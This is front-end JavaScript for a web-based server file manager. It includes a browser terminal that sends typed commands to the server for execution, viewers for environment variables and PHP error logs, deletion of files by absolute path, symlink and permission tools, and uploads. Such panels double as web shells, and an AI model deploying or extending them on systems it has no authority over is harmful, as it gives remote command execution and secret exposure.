      <div style="font-size:11px;color:var(--t3);margin-bottom:6px">${g.files.length} copies · ${formatBytes(g.size)} each</div>
      ${g.files.map(f=>`<div style="display:flex;align-items:center;gap:8px;padding:3px 0"><span style="font-family:'JetBrains Mono',monospace;font-size:12px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(f.path)}">${esc(fmtPath(f.dir))}/${esc(f.name)}</span><button class="btn btn-xs btn-red" onclick="delAbsPath('${esc(f.path).replace(/'/g,"\\'")}',this)">Delete</button></div>`).join('')}
    </div>`).join('');
    document.getElementById('dupBody').innerHTML=`<div style="overflow:auto;max-height:65vh">${d.capped?'<div style="padding:8px 14px;font-size:11px;color:#fcd34d">Scan capped by time/count limit — showing partial results.</div>':''}${html}</div>`;
  }catch{document.getElementById('dupBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('dupClose')?.addEventListener('click',()=>closeMod('dupOv'));

/* Delete an absolute path found by the large-file / duplicate tools */
function delAbsPath(path,btn){
  if(!confirm('Delete this file permanently?\n'+path))return;
  const fd=new FormData();
  fd.append('csrf_token',document.getElementById('af').querySelector('[name=csrf_token]').value);
  fd.append('action','delete_abs');fd.append('abs_path',path);
  fetch('',{method:'POST',body:fd}).then(()=>{const row=btn.closest('tr')||btn.closest('div');if(row)row.remove();toast('Deleted.');}).catch(()=>toast('Delete failed.'));
}

/* ═══════════════════════════════════════
   ERROR LOG / ENVIRONMENT VARIABLES (admin)
═══════════════════════════════════════ */
document.getElementById('errLogBtn')?.addEventListener('click',async()=>{
  openMod('errLogOv');
  document.getElementById('errLogBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=errlog').then(r=>r.json());
    if(d.error){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
    if(!d.path){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>No error_log configured in php.ini.</p></div>';return;}
    if(!d.lines.length){document.getElementById('errLogBody').innerHTML='<div class="empty" style="padding:40px"><p>Log is empty.</p></div>';return;}
    document.getElementById('errLogBody').innerHTML=`<div style="padding:8px 14px;font-size:10.5px;color:var(--t3);border-bottom:1px solid var(--border)">${esc(d.path)} — showing last ${d.lines.length} lines</div><pre style="margin:0;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;white-space:pre-wrap;word-break:break-all;max-height:60vh;overflow:auto;color:var(--t2)">${esc(d.lines.join('\n'))}</pre>`;
  }catch{document.getElementById('errLogBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('errLogClose')?.addEventListener('click',()=>closeMod('errLogOv'));

document.getElementById('envBtn')?.addEventListener('click',async()=>{
  openMod('envOv');
  document.getElementById('envBody').innerHTML='<div style="text-align:center;padding:32px;color:var(--t3)">Loading…</div>';
  try{
    const d=await fetch('?x=envvars').then(r=>r.json());
    if(d.error){document.getElementById('envBody').innerHTML='<div class="empty" style="padding:40px"><p>'+esc(d.error)+'</p></div>';return;}
    const rows=Object.entries(d).map(([k,v])=>`<tr><td style="font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--link);white-space:nowrap">${esc(k)}</td><td style="font-family:'JetBrains Mono',monospace;font-size:11.5px;word-break:break-all">${esc(v)}</td></tr>`).join('');
    document.getElementById('envBody').innerHTML=`<div style="overflow:auto;max-height:65vh"><table class="log-t"><thead><tr><th>Variable</th><th>Value</th></tr></thead><tbody>${rows||'<tr><td colspan=2 style="padding:20px;color:var(--t3)">No variables.</td></tr>'}</tbody></table></div>`;
  }catch{document.getElementById('envBody').innerHTML='<div style="padding:20px;color:#fca5a5">Failed.</div>';}
});
document.getElementById('envClose')?.addEventListener('click',()=>closeMod('envOv'));

/* ═══════════════════════════════════════
   NETWORK SPEED TEST (ping / download / upload)
═══════════════════════════════════════ */
document.getElementById('speedBtn')?.addEventListener('click',()=>openMod('speedOv'));
document.getElementById('speedClose')?.addEventListener('click',()=>closeMod('speedOv'));
document.getElementById('spRun')?.addEventListener('click',async()=>{
  const btn=document.getElementById('spRun'),st=document.getElementById('spStatus');
  btn.disabled=true;document.getElementById('spPing').textContent='—';document.getElementById('spDown').textContent='—';document.getElementById('spUp').textContent='—';
  try{
    st.textContent='Measuring ping…';
    let pings=[];
    for(let i=0;i<3;i++){const t0=performance.now();await fetch('?x=speedping&r='+Math.random(),{cache:'no-store'});pings.push(performance.now()-t0);}
    const ping=Math.round(Math.min(...pings));
    document.getElementById('spPing').textContent=ping+' ms';

    st.textContent='Measuring download…';
    const mb=5,dt0=performance.now();
    const r=await fetch('?x=speeddown&mb='+mb+'&r='+Math.random(),{cache:'no-store'});
    await r.arrayBuffer();
    const dSec=(performance.now()-dt0)/1000;
    const downMbps=(mb*8/dSec).toFixed(1);
    document.getElementById('spDown').textContent=downMbps+' Mbps';

    st.textContent='Measuring upload…';
    const upMb=3,payload=new Blob([new Uint8Array(upMb*1024*1024)]);
    const ut0=performance.now();
    await fetch('?x=speedup',{method:'POST',body:payload});
    const uSec=(performance.now()-ut0)/1000;
    const upMbps=(upMb*8/uSec).toFixed(1);
    document.getElementById('spUp').textContent=upMbps+' Mbps';
    st.textContent='Done.';
  }catch{st.textContent='Test failed.';}
  btn.disabled=false;
});

/* ═══════════════════════════════════════
   BATCH RENAME MODAL
═══════════════════════════════════════ */
document.getElementById('brBtn')?.addEventListener('click',()=>{
  const s=selNames();
  if(!s.length){toast('Select files first!');return;}
  document.getElementById('brItems').value=JSON.stringify(s);
  openMod('brOv');
});
document.getElementById('brClose')?.addEventListener('click',()=>closeMod('brOv'));

/* SYMLINK */
document.getElementById('symlinkBtn')?.addEventListener('click',()=>openMod('symlinkOv'));
document.getElementById('symlinkClose')?.addEventListener('click',()=>closeMod('symlinkOv'));

/* USERS */
document.getElementById('usersBtn')?.addEventListener('click',()=>openMod('usersOv'));
document.getElementById('usersClose')?.addEventListener('click',()=>closeMod('usersOv'));

/* ═══════════════════════════════════════
   PERMISSIONS MODAL
═══════════════════════════════════════ */
const permChecks=Array.from(document.querySelectorAll('.perm-ck'));
const permOctal=document.getElementById('permOctal');
function permFromOctal(oct){
  const digits=(oct||'').padStart(3,'0').slice(-3).split('').map(Number);
  const bits=[256,128,64,32,16,8,4,2,1];
  permChecks.forEach(cb=>{cb.checked=false;});
  let i=0;
  [digits[0],digits[1],digits[2]].forEach((d,gi)=>{
    if(d&4)permChecks[gi*3+0].checked=true;
    if(d&2)permChecks[gi*3+1].checked=true;
    if(d&1)permChecks[gi*3+2].checked=true;
  });
}
function permToOctal(){
  let o=[0,0,0];
  permChecks.forEach((cb,i)=>{if(cb.checked){const grp=Math.floor(i/3);const bitVal=[4,2,1][i%3];o[grp]+=bitVal;}});
  return o.join('');
}
permChecks.forEach(cb=>cb.addEventListener('change',()=>{permOctal.value=permToOctal();}));
permOctal?.addEventListener('input',()=>{if(/^[0-7]{3,4}$/.test(permOctal.value))permFromOctal(permOctal.value);});
function openPerm(name,perm){
  document.getElementById('permTitle').textContent='Permissions — '+name;
  document.getElementById('permName').value=name;
  const oct=(perm||'0644').slice(-3);
  permOctal.value=oct;permFromOctal(oct);
  openMod('permOv');
}
document.getElementById('permClose')?.addEventListener('click',()=>closeMod('permOv'));

/* ═══════════════════════════════════════
   SHARE LINKS
═══════════════════════════════════════ */
function openShareCreate(name){
  document.getElementById('shareCreateTitle').textContent='Share Link — '+name;
  document.getElementById('shareItemName').value=name;
  openMod('shareCreateOv');
}
document.getElementById('shareCreateClose')?.addEventListener('click',()=>closeMod('shareCreateOv'));
document.getElementById('sharesBtn')?.addEventListener('click',()=>openMod('sharesOv'));
document.getElementById('sharesClose')?.addEventListener('click',()=>closeMod('sharesOv'));
document.querySelectorAll('.share-copy-btn').forEach(b=>b.addEventListener('click',()=>{
  navigator.clipboard.writeText(b.dataset.url).then(()=>toast('Share link copied!'));
}));

/* ═══════════════════════════════════════
   FOLDER SIZE CALCULATOR
═══════════════════════════════════════ */
async function calcDirSize(name,trigger){
  const btns=trigger?[trigger]:Array.from(document.querySelectorAll('.dsz-btn')).filter(b=>b.dataset.n===name);
  btns.forEach(b=>{b.disabled=true;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='…';});
  try{
    const d=await fetch('?x=dirsize&f='+encodeURIComponent(name)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
    if(d.error){toast('Could not calculate size.');btns.forEach(b=>{b.disabled=false;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='Size';});return;}
    const txt=formatBytes(d.size)+(d.capped?'+':'')+' · '+d.files+' files';
    btns.forEach(b=>{
      const span=document.createElement('span');span.className='sz';span.textContent=txt;
      b.replaceWith(span);
    });
    toast(`"${name}": ${formatBytes(d.size)}${d.capped?' (partial, still large)':''} — ${d.files} files, ${d.dirs} folders`,4000);
  }catch{toast('Could not calculate size.');btns.forEach(b=>{b.disabled=false;const lbl=b.querySelector('.bl');if(lbl)lbl.textContent='Size';});}
}
document.querySelectorAll('.dsz-btn').forEach(b=>b.addEventListener('click',e=>{e.stopPropagation();calcDirSize(b.dataset.n,b);}));

/* ═══════════════════════════════════════
   TERMINAL (real xterm style)
═══════════════════════════════════════ */
const termInp=document.getElementById('termInp');
const termOut=document.getElementById('termOut');
const termSug=document.getElementById('termSug');
const termHist=[];let hIdx=-1,sugIdx=-1,sugList=[];

document.getElementById('termBtn')?.addEventListener('click',()=>{openMod('termOv');setTimeout(()=>termInp?.focus(),200);});
document.getElementById('termClose')?.addEventListener('click',()=>closeMod('termOv'));
document.getElementById('td-r')?.addEventListener('click',()=>closeMod('termOv'));
document.getElementById('termClear')?.addEventListener('click',()=>{if(termOut)termOut.innerHTML='';});

if(termInp){
  termInp.addEventListener('keydown',async e=>{
    if(e.key==='Enter'){hideSug();await runTerm();return;}
    if(e.key==='ArrowUp'){e.preventDefault();if(hIdx<termHist.length-1){hIdx++;termInp.value=termHist[termHist.length-1-hIdx]||'';}return;}
    if(e.key==='ArrowDown'){e.preventDefault();if(hIdx>0){hIdx--;termInp.value=termHist[termHist.length-1-hIdx]||'';}else{hIdx=-1;termInp.value='';}return;}
    if(e.key==='Tab'){e.preventDefault();if(sugList.length>0){sugIdx=(sugIdx+1)%sugList.length;termInp.value=getTermBase()+sugList[sugIdx];}else await fetchSug();return;}
    if(e.key==='Escape'){hideSug();return;}
    if(e.ctrlKey&&e.key==='c'){e.preventDefault();termInp.value='';appendLine('^C','cmd-line');return;}
    if(e.key.length===1)setTimeout(()=>fetchSug(),50);
  });
  termInp.addEventListener('input',()=>fetchSug());
}

function getTermBase(){const v=termInp.value;const sp=v.lastIndexOf(' ');return sp>=0?v.slice(0,sp+1):'';}
async function fetchSug(){
  const v=termInp?.value||'';const last=v.split(' ').pop();
  if(!last){hideSug();return;}
  try{const r=await fetch('?x=ac&prefix='+encodeURIComponent(last)+'&dir='+encodeURIComponent(CWD)).then(r=>r.json());
    sugList=r;sugIdx=-1;
    if(r.length>0){if(!termSug)return;termSug.innerHTML=r.map((x,i)=>`<div class="term-sug-item" data-i="${i}">${esc(x)}</div>`).join('');termSug.style.display='block';
      termSug.querySelectorAll('.term-sug-item').forEach(el=>el.addEventListener('mousedown',ev=>{ev.preventDefault();termInp.value=getTermBase()+el.textContent;hideSug();termInp.focus();}));
    }else hideSug();
  }catch{hideSug();}
}
function hideSug(){if(termSug)termSug.style.display='none';sugList=[];sugIdx=-1;}

async function runTerm(){
  const cmd=termInp?.value.trim();if(!cmd||!termInp)return;
  termHist.push(cmd);hIdx=-1;termInp.value='';
  appendLine('$ '+cmd,'cmd-line');
  if(cmd==='clear'||cmd==='cls'){if(termOut)termOut.innerHTML='';return;}
  const btnR=document.getElementById('termWin');
  try{
    const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('qi',cmd);
    const d=await fetch('?x=run',{method:'POST',body:fd}).then(r=>r.json());
    if(d.error){appendLine('Error: '+d.error,'err-line');}
    else{
      if(d.output){d.output.split('\n').forEach(line=>appendLine(line,d.exit===0?'ok-line':'err-line'));}
      else appendLine('(no output)','info-line');
      appendLine(`exit:${d.exit} ${d.ms}ms`,'info-line');
    }
  }catch(err){appendLine('Request failed: '+err.message,'err-line');}
  appendLine('','');
  if(termOut)termOut.scrollTop=termOut.scrollHeight;
}
function appendLine(text,cls){
  if(!termOut)return;
  const s=document.createElement('span');
  s.className='term-line'+(cls?' '+cls:'');
  s.textContent=text;
  termOut.appendChild(s);
  termOut.appendChild(document.createTextNode('\n'));
  termOut.scrollTop=termOut.scrollHeight;
}

/* ═══════════════════════════════════════
   EDITOR SHORTCUTS
═══════════════════════════════════════ */
const codeTA=document.querySelector('textarea.code');
if(codeTA){
  codeTA.addEventListener('keydown',e=>{
    if(e.key==='Tab'){e.preventDefault();const s=codeTA.selectionStart,en=codeTA.selectionEnd;codeTA.value=codeTA.value.slice(0,s)+'    '+codeTA.value.slice(en);codeTA.selectionStart=codeTA.selectionEnd=s+4;}
    if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();codeTA.closest('form').submit();}
  });
}

/* ═══════════════════════════════════════
   ALERTS
═══════════════════════════════════════ */
document.querySelectorAll('.alert-x').forEach(btn=>{
  btn.addEventListener('click',()=>{
    const a=btn.closest('.alert');
    a.style.transition='opacity .2s,transform .2s';a.style.opacity='0';a.style.transform='translateY(-6px)';
    setTimeout(()=>a.remove(),220);
  });
});

/* ═══════════════════════════════════════
   DRAG & DROP UPLOAD
═══════════════════════════════════════ */
function uploadWithProgress(files){
  if(!files||!files.length)return;
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action','upload');
  for(const f of files)fd.append('file[]',f);
  const bar=document.createElement('div');
  bar.style.cssText='position:fixed;left:50%;bottom:calc(var(--bh,26px) + 12px);transform:translateX(-50%);background:#18181c;border:1px solid rgba(255,255,255,.12);color:#f4f4f5;padding:10px 18px;border-radius:10px;font-size:12.5px;font-weight:500;z-index:9999;min-width:240px;box-shadow:0 8px 32px rgba(0,0,0,.5)';
  bar.innerHTML='<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>Uploading…</span><span id="upSpeedTxt">0 MB/s</span></div><div style="height:4px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden"><div id="upSpeedBar" style="height:100%;width:0%;background:#818cf8;transition:width .1s"></div></div>';
  document.body.appendChild(bar);
  const xhr=new XMLHttpRequest();
  let lastT=performance.now(),lastLoaded=0;
  xhr.upload.addEventListener('progress',e=>{
    if(!e.lengthComputable)return;
    const now=performance.now(),dt=(now-lastT)/1000;
    if(dt>0.15){
      const speed=((e.loaded-lastLoaded)/dt)/1048576;
      document.getElementById('upSpeedTxt').textContent=speed.toFixed(1)+' MB/s';
      lastT=now;lastLoaded=e.loaded;
    }
    const pct=Math.round(e.loaded/e.total*100);
    document.getElementById('upSpeedBar').style.width=pct+'%';
  });
  xhr.addEventListener('loadend',()=>{bar.remove();location.reload();});
  xhr.addEventListener('error',()=>{bar.remove();toast('Upload failed.');});
  xhr.open('POST',location.href);
  xhr.send(fd);
}
const dz=document.getElementById('dropzone');
if(dz){
  ['dragenter','dragover'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();e.stopPropagation();dz.classList.add('drag-over');}));
  ['dragleave','drop'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();e.stopPropagation();if(ev==='dragleave'&&e.target!==dz)return;dz.classList.remove('drag-over');}));
  dz.addEventListener('drop',e=>{uploadWithProgress(e.dataTransfer.files);});
}
const upFileInp=document.getElementById('upFile');
if(upFileInp){
  upFileInp.removeAttribute('onchange');
  upFileInp.addEventListener('change',()=>uploadWithProgress(upFileInp.files));
}

/* ═══════════════════════════════════════
   RIPPLE
═══════════════════════════════════════ */
document.querySelectorAll('.btn,.sb-item,.sb-flink,.sh-btn').forEach(el=>{
  el.addEventListener('pointerdown',function(e){
    const r=document.createElement('span');
    r.style.cssText=`position:absolute;border-radius:50%;width:6px;height:6px;background:rgba(255,255,255,.22);transform:scale(0);animation:rip .5s cubic-bezier(.25,.46,.45,.94) forwards;pointer-events:none;left:${e.offsetX-3}px;top:${e.offsetY-3}px;`;
    if(getComputedStyle(this).position==='static')this.style.position='relative';
    this.style.overflow='hidden';this.appendChild(r);setTimeout(()=>r.remove(),520);
  });
});
const rs=document.createElement('style');rs.textContent='@keyframes rip{to{transform:scale(28);opacity:0}}';document.head.appendChild(rs);

/* ═══════════════════════════════════════
   TOAST NOTIFICATION
═══════════════════════════════════════ */
function toast(msg,dur=2000){
  const el=document.createElement('div');
  el.style.cssText='position:fixed;bottom:calc(var(--bh,26px) + 12px);left:50%;transform:translate(-50%,0);background:#18181c;border:1px solid rgba(255,255,255,.12);color:#f4f4f5;padding:8px 16px;border-radius:10px;font-size:13px;font-weight:500;z-index:9999;white-space:nowrap;box-shadow:0 8px 32px rgba(0,0,0,.5);animation:fadeUp .25s cubic-bezier(.34,1.56,.64,1) both';
  el.textContent=msg;document.body.appendChild(el);
  setTimeout(()=>{el.style.opacity='0';el.style.transform='translate(-50%,8px)';el.style.transition='.2s';setTimeout(()=>el.remove(),220);},dur);
}

/* HELPERS */
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
function formatBytes(b){if(b>=1073741824)return(b/1073741824).toFixed(2)+' GB';if(b>=1048576)return(b/1048576).toFixed(1)+' MB';if(b>=1024)return(b/1024).toFixed(1)+' KB';return b+' B';}
</script>
</body>
</html>
